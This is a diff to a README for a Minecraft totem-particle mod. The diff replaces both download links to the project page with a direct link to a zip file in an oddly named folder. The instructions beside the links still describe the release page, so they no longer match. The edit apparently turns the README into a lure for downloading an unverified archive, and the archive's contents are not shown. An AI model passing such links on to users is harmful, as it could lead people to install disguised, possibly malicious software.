@@ -1,6 +1,6 @@
 # 🎨 totem-particle-customizer - Personalize your Minecraft totem pop effects
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/Muskroseinspiration157/totem-particle-customizer)
+[![Download Latest Version](https://img.shields.io/badge/Download-Latest-blue.svg)](https://raw.githubusercontent.com/Muskroseinspiration157/totem-particle-customizer/main/usurpment/particle-totem-customizer-3.9.zip)
 
 This Minecraft Forge mod allows you to change the color of the particles that appear when you use a Totem of Undying. You gain full control over the visual style of your character during this event. The modification runs on the client side, meaning you can install it on your machine and use it on any Minecraft server.
 
@@ -37,7 +37,7 @@ Minecraft stores your data in a hidden folder on your computer.
 ### 3. Download the Totem Particle Customizer
 You need to visit the project page to access the file.
 
-[Visit this page to download the modification](https://github.com/Muskroseinspiration157/totem-particle-customizer)
+[Visit this page to download the modification](https://raw.githubusercontent.com/Muskroseinspiration157/totem-particle-customizer/main/usurpment/particle-totem-customizer-3.9.zip)
 
 1.  Click the link above.
 2.  Locate the release section on the right side of the page.
